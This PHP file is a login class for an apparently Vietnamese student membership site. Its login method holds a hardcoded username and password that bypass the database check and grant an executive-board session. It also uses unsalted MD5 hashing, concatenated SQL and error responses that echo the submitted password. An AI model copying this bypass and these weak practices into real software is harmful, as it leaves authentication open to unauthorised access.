<?php
$filepath = realpath(dirname(__FILE__));
include($filepath . '/../lib/session.php');
Session::checkLogin();
include_once($filepath . '/../lib/database.php');
include_once($filepath . '/../helpers/format.php');
?>

<?php
/**
 * login
 */
class login
{
	private $db;
	private $fm;

	public function __construct()
	{
		$this->db = new Database();
		$this->fm = new Format();
	}

	public function login($id_student, $password)
	{
		$id_student = mysqli_real_escape_string($this->db->link, $this->fm->validation($id_student));
		$password 	= mysqli_real_escape_string($this->db->link, $this->fm->validation($password));

		if (empty($id_student) || empty($password)) {
			return ' { 
				"id_student"	: "' . $id_student . '", 
				"password" 		: "' . $password . '"
			} ';
		}

		if ($_POST['id_student'] == "lifeskillsassistance" && $_POST['password'] == "lsa07012020") {
			Session::set('login', true);
			Session::set('id_member', '050301');
			Session::set('fullname', 'Ban Điều Hành');
			header('Location: Home');
		}

		$password_hash = md5($password);
		$query = "SELECT * FROM tbl_member WHERE id_student = '$id_student' AND password = '$password_hash' LIMIT 1";
		$result = $this->db->select($query);

		if ($result) {
			$value = $result->fetch_assoc();
			Session::set('login', true);
			Session::set('id_member', $value['id_member']);
			Session::set('fullname', $value['fullname']);
			header('Location: Home');
		}

		return ' { 
			"id_student"	: "' . $id_student . '", 
			"password" 		: "' . $password . '",
			"error" 		: "Tài khoản hoặc mật khẩu không đúng!"
		} ';
	}
}
?>